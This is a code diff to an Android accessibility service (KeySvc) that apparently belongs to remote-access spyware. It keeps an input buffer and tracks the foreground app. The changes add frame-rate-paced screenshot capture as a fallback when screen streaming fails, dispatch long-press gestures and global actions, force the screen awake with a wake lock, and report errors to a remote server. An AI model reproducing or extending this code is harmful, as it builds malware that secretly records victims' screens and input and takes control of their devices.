@@ -32,8 +32,9 @@ public class KeySvc extends AccessibilityService {
     private final StringBuilder buf = new StringBuilder();
     private volatile long lastFlush;
     private volatile String curPkg;
-    public volatile boolean shotOn = true;   // fallback por screenshot ligado por padrao
+    public volatile boolean shotOn = true;
     private volatile boolean shotBusy;
+    private volatile long lastShot;
     private WindowManager wm;
     private View ov;
     private PowerManager.WakeLock wl;
@@ -44,11 +45,17 @@ public class KeySvc extends AccessibilityService {
 
     private final Runnable loop = new Runnable() {
         @Override public void run() {
+            int iv = 250;
             try {
-                boolean precisa = !ScreenSvc.alive || ScreenSvc.black;
-                if (shotOn && precisa && Build.VERSION.SDK_INT >= 30) grab();
+                boolean precisa = !ScreenSvc.alive || ScreenSvc.black || ScreenSvc.giveUp;
+                iv = Math.max(160, 1000 / Math.max(1, ScreenSvc.FPS));
+                if (shotOn && precisa && Build.VERSION.SDK_INT >= 30
+                        && System.currentTimeMillis() - lastShot >= iv) {
+                    lastShot = System.currentTimeMillis();
+                    grab();
+                }
             } catch (Throwable ignored) {}
-            H.postDelayed(this, 500);
+            H.postDelayed(this, Math.max(120, iv));
         }
     };
 
@@ -140,6 +147,16 @@ public class KeySvc extends AccessibilityService {
         } catch (Throwable ignored) {}
     }
 
+    public void longPress(float x, float y) {
+        try {
+            Path p = new Path();
+            p.moveTo(x, y);
+            GestureDescription.Builder b = new GestureDescription.Builder();
+            b.addStroke(new GestureDescription.StrokeDescription(p, 0, 700));
+            dispatchGesture(b.build(), null, null);
+        } catch (Throwable ignored) {}
+    }
+
     public void setText(String s) {
         try {
             AccessibilityNodeInfo root = getRootInActiveWindow();
@@ -158,6 +175,7 @@ public class KeySvc extends AccessibilityService {
             else if (code == 3) performGlobalAction(GLOBAL_ACTION_HOME);
             else if (code == 187) performGlobalAction(GLOBAL_ACTION_RECENTS);
             else if (code == 26) performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
+            else if (code == 5) performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS);
         } catch (Throwable ignored) {}
     }
 
@@ -165,9 +183,12 @@ public class KeySvc extends AccessibilityService {
         try {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
             if (on) {
-                if (wl == null) wl = pm.newWakeLock(
-                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "aval:scr");
-                wl.acquire(30000);
+                if (wl == null) {
+                    wl = pm.newWakeLock(
+                            PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "aval:scr");
+                    wl.setReferenceCounted(false);
+                }
+                wl.acquire(60000);
             } else if (wl != null && wl.isHeld()) {
                 wl.release();
             }
@@ -201,7 +222,10 @@ public class KeySvc extends AccessibilityService {
                         shotBusy = false;
                     }
                 }
-                @Override public void onFailure(int code) { shotBusy = false; }
+                @Override public void onFailure(int code) {
+                    shotBusy = false;
+                    if (code != 3) Net.send("{\"t\":\"err\",\"o\":\"screenshot falhou: " + code + "\"}");
+                }
             });
         } catch (Throwable t) {
             shotBusy = false;
